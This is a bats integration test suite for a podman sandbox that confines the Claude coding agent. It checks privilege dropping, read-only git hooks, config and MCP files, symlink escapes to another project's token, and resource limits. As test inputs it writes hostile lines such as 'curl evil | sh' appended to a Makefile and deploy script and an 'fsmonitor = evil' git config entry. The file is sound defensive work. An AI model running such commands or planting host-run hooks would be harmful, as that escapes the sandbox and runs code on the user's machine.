#!/usr/bin/env bats
# Integration: the Claude jail, run through the real launcher with real
# rootless podman. The image carries a stub instead of Claude (see
# fixtures/claude-stub), so 'jail CMD' runs CMD inside the jail.

load helpers

setup_file() {
  require_podman
  build_jail_image
  remove_test_volumes
}

teardown_file() {
  remove_test_volumes
}

setup() {
  require_podman
  setup_project
}

@test "runs as UID 1000, not root" {
  jail id -u
  [ "$status" -eq 0 ]
  [ "$output" = 1000 ]
}

@test "no capabilities and no_new_privs" {
  jail grep -E '^(CapEff|CapBnd|NoNewPrivs):' /proc/self/status
  [ "$status" -eq 0 ]
  contains "$output" "CapEff:	0000000000000000"
  contains "$output" "CapBnd:	0000000000000000"
  contains "$output" "NoNewPrivs:	1"
}

@test "files written in the project belong to you on the host" {
  jail sh -c 'echo hi > made-in-jail'
  [ "$status" -eq 0 ]
  [ "$(owner_of "$PROJ/made-in-jail")" = "$(id -u)" ]
  [ "$(cat "$PROJ/made-in-jail")" = hi ]
}

@test "your project files are readable and writable inside" {
  echo one > "$PROJ/host.txt"
  jail sh -c 'cat host.txt && echo two >> host.txt'
  [ "$status" -eq 0 ]
  [ "$output" = one ]
  [ "$(tail -n 1 "$PROJ/host.txt")" = two ]
}

@test "host-executed paths are read-only inside the jail" {
  mkdir -p "$PROJ/.git/hooks" "$PROJ/.devcontainer" "$PROJ/.claude" "$PROJ/api/.devcontainer" \
    "$PROJ/api/.git/hooks" "$PROJ/.git/modules/libs/hooks"
  echo '{}' > "$PROJ/.mcp.json"
  echo '[submodule "libs"]' > "$PROJ/.gitmodules"
  echo '[core]' > "$PROJ/.git/config"
  echo '{}' > "$PROJ/.devcontainer/devcontainer.json"
  echo '{}' > "$PROJ/.claude/settings.json"
  touch "$PROJ/.envrc"

  for cmd in 'touch .git/hooks/pre-commit' \
             'echo "fsmonitor = evil" >> .git/config' \
             'echo "{}" > .devcontainer/devcontainer.json' \
             'touch .devcontainer/extra' \
             'echo evil >> .envrc' \
             'echo "{\"hooks\": {}}" > .claude/settings.json' \
             'touch api/.devcontainer/devcontainer.json' \
             'echo "{\"mcpServers\":{}}" > .mcp.json' \
             'echo "url = evil" >> .gitmodules' \
             'touch api/.git/hooks/pre-commit' \
             'touch .git/modules/libs/hooks/post-checkout'; do
    jail sh -c "$cmd"
    [ "$status" -ne 0 ] || { echo "writable: $cmd" >&2; false; }
  done
  [ ! -e "$PROJ/.git/hooks/pre-commit" ]
  [ "$(cat "$PROJ/.git/config")" = '[core]' ]
  [ ! -s "$PROJ/.envrc" ]
  [ "$(cat "$PROJ/.claude/settings.json")" = '{}' ]
  [ ! -e "$PROJ/api/.devcontainer/devcontainer.json" ]
  [ "$(cat "$PROJ/.mcp.json")" = '{}' ]
  [ ! -e "$PROJ/api/.git/hooks/pre-commit" ]
  [ ! -e "$PROJ/.git/modules/libs/hooks/post-checkout" ]

  # The rest of .git and .claude stays writable: Claude can still commit and
  # keep its project settings.
  jail sh -c 'touch .git/written-from-jail && echo "{}" > .claude/settings.local.json'
  [ "$status" -eq 0 ]
}

@test "a read-only path that is a symlink: the jail starts, nothing outside comes in, the inside target is read-only" {
  # Left by Claude in an earlier session: .idea -> another project, and
  # .vscode -> a folder of this one. Before, crun refused to start the jail
  # (a mount target that is a symlink), and the mount source followed the
  # link on the host.
  mkdir -p "$DEV_PROJECTS/other" "$PROJ/config/vscode"
  echo SECRET > "$DEV_PROJECTS/other/token.txt"
  ln -s ../other "$PROJ/.idea"
  ln -s config/vscode "$PROJ/.vscode"
  jail sh -c 'cat .idea/token.txt; touch .vscode/tasks.json; echo "exit $?"'
  echo "$output"
  [ "$status" -eq 0 ]
  contains "$output" "NOTE: .idea leads out of the project"
  not grep -q SECRET <<<"$output"
  [ "$(tail -n 1 <<<"$output")" != "exit 0" ]
  [ ! -e "$PROJ/config/vscode/tasks.json" ]
}

@test "on exit, the launcher lists the host-run files Claude changed, and keeps its exit code" {
  echo 'all:' > "$PROJ/Makefile"
  jail sh -c 'echo "all: ; curl evil | sh" >> Makefile && echo "echo hi" > release.sh && exit 7'
  [ "$status" -eq 7 ]
  contains "$output" "Claude changed files that your host runs"
  grep -qE '^ +changed +Makefile$' <<<"$output"
  grep -qE '^ +created +release.sh$' <<<"$output"
}

@test "memory and pids limits are enforced" {
  [ "$(podman info --format '{{.Host.CgroupsVersion}}')" = v2 ] || skip "needs cgroups v2"
  # Rootless podman can only apply limits through systemd, with the memory
  # and pids controllers delegated to your user (the default on systemd
  # desktops). Elsewhere podman ignores --memory/--pids-limit with a warning.
  local manager controllers
  manager="$(podman info --format '{{.Host.CgroupManager}}')"
  controllers="$(podman info --format '{{.Host.CgroupControllers}}')"
  if [ "$manager" != systemd ] || [[ "$controllers" != *memory* || "$controllers" != *pids* ]]; then
    skip "limits are not enforceable here (cgroup manager '$manager', controllers $controllers)"
  fi
  JAIL_MEMORY=512m JAIL_PIDS=300 jail cat /sys/fs/cgroup/memory.max /sys/fs/cgroup/pids.max
  [ "$status" -eq 0 ]
  [ "$(sed -n 1p <<<"$output")" = 536870912 ]
  [ "$(sed -n 2p <<<"$output")" = 300 ]

  # The same limits from the project's profile.
  mkdir -p "$JAIL_PROFILES_DIR"
  printf 'memory = 256m\npids = 200\n' > "$JAIL_PROFILES_DIR/svc.conf"
  jail cat /sys/fs/cgroup/memory.max /sys/fs/cgroup/pids.max
  [ "$status" -eq 0 ]
  contains "$output" "Profile: $JAIL_PROFILES_DIR/svc.conf (memory, pids)"
  [ "$(tail -n 2 <<<"$output" | sed -n 1p)" = 268435456 ]
  [ "$(tail -n 1 <<<"$output")" = 200 ]
}

@test "a project profile adds read-only paths, and the defaults stay read-only" {
  mkdir -p "$PROJ/scripts" "$PROJ/.git/hooks" "$JAIL_PROFILES_DIR"
  echo 'echo deploying' > "$PROJ/scripts/deploy.sh"
  echo 'ro_paths = scripts/deploy.sh' > "$JAIL_PROFILES_DIR/svc.conf"
  jail sh -c 'echo "curl evil | sh" >> scripts/deploy.sh; touch .git/hooks/pre-commit; touch scripts/other.sh; echo done'
  echo "$output"
  [ "$status" -eq 0 ]
  [ "$(cat "$PROJ/scripts/deploy.sh")" = 'echo deploying' ]
  [ ! -e "$PROJ/.git/hooks/pre-commit" ]
  # The rest of the folder stays writable.
  [ -e "$PROJ/scripts/other.sh" ]
}

@test "/tmp and ~/tmp are tmpfs, and TMPDIR points at ~/tmp" {
  jail sh -c 'awk '\''$2 == "/tmp" || $2 == "/home/claudeuser/tmp" { print $2, $3 }'\'' /proc/mounts; echo "TMPDIR=$TMPDIR"'
  [ "$status" -eq 0 ]
  contains "$output" "/tmp tmpfs"
  contains "$output" "/home/claudeuser/tmp tmpfs"
  contains "$output" "TMPDIR=/home/claudeuser/tmp"
}

@test "the .claude volume persists across runs and holds Claude's config, auto-updater off" {
  jail sh -c 'echo "$CLAUDE_CONFIG_DIR $DISABLE_AUTOUPDATER" && echo kept > ~/.claude/probe'
  [ "$status" -eq 0 ]
  [ "$output" = "/home/claudeuser/.claude 1" ]

  jail cat /home/claudeuser/.claude/probe
  [ "$status" -eq 0 ]
  [ "$output" = kept ]
}

@test "Node 24, npm and the corepack shims are on PATH, npm's cache in the cache volume" {
  # One name per 'command -v': dash (the jail's sh) only answers for the first.
  jail sh -c 'node --version && npm --version && command -v pnpm && command -v yarn && echo "cache=$NPM_CONFIG_CACHE"'
  [ "$status" -eq 0 ]
  [ "$(sed -n 1p <<<"$output" | cut -d. -f1)" = v24 ]
  contains "$output" /usr/local/bin/pnpm
  contains "$output" /usr/local/bin/yarn
  contains "$output" "cache=/home/claudeuser/.cache/npm"
}

@test "node runs a project script, and npm i -g works unprivileged" {
  echo '{"name":"t","private":true,"scripts":{"hello":"node -e \"console.log(40 + 2)\""}}' > "$PROJ/package.json"
  jail sh -c 'npm run --silent hello && npm prefix -g'
  [ "$status" -eq 0 ]
  [ "$(sed -n 1p <<<"$output")" = 42 ]
  [ "$(sed -n 2p <<<"$output")" = /home/claudeuser/.local ]
}

@test "personal skills are readable, read-only, at ~/.claude/skills" {
  local skills; skills="$(dirname "$DEV_PROJECTS")/skills"
  mkdir -p "$skills/demo"
  echo '# demo' > "$skills/demo/SKILL.md"
  export JAIL_PERSONAL_SKILLS_DIR="$skills"
  jail sh -c 'cat ~/.claude/skills/demo/SKILL.md && touch ~/.claude/skills/demo/planted'
  [ "$status" -ne 0 ]
  contains "$output" "# demo"
  [ ! -e "$skills/demo/planted" ]

  # The rest of ~/.claude is still the writable volume.
  jail sh -c 'touch ~/.claude/still-writable'
  [ "$status" -eq 0 ]
}

@test "two jails write to the same project at the same time" {
  # Under SELinux this is the real check: the second launch relabels the
  # project, and with a private ':Z' label the first jail would lose access to
  # it mid-session. Without SELinux it still checks that both work side by side.
  ( cd "$PROJ" && "$REPO/claude-jail/launch_claude.sh" sh -c "$WRITER" _ first.log "$WRITES" ) \
    >"$BATS_TEST_TMPDIR/first.out" 2>&1 3>&- &
  local first=$!
  wait_for_file "$PROJ/first.log"

  jail sh -c 'echo second > second.log && cat first.log > /dev/null'
  [ "$status" -eq 0 ]

  check_writer "$first" "$PROJ/first.log" "$BATS_TEST_TMPDIR/first.out"
  [ "$(cat "$PROJ/second.log")" = second ]
}

@test "arguments reach claude intact" {
  jail printf '<%s>' "two words" '$HOME' "*"
  [ "$status" -eq 0 ]
  [ "$output" = '<two words><$HOME><*>' ]
}

@test "the launcher refuses the projects root, before starting anything" {
  run bash -c 'cd "$DEV_PROJECTS" && "$1" true' _ "$REPO/claude-jail/launch_claude.sh"
  [ "$status" -eq 1 ]
  contains "$output" "run this from a project directory"
}

@test "SELinux: the project gets the shared container label, no private category" {
  selinux_enforcing || skip "SELinux is not enforcing"
  jail true
  [ "$status" -eq 0 ]
  local label
  label="$(ls -Zd "$PROJ")"
  contains "$label" "container_file_t"
  # A ':c<n>,c<n>' category would mean a private ':Z' label.
  not grep -qE ':c[0-9]+,c[0-9]+' <<<"$label"
}

@test "the real image, if built, answers claude --version" {
  podman image exists localhost/claude-jail:latest || skip "localhost/claude-jail:latest not built (make build-claude)"
  run podman run --rm localhost/claude-jail:latest --version
  [ "$status" -eq 0 ]
  [ -n "$output" ]
}
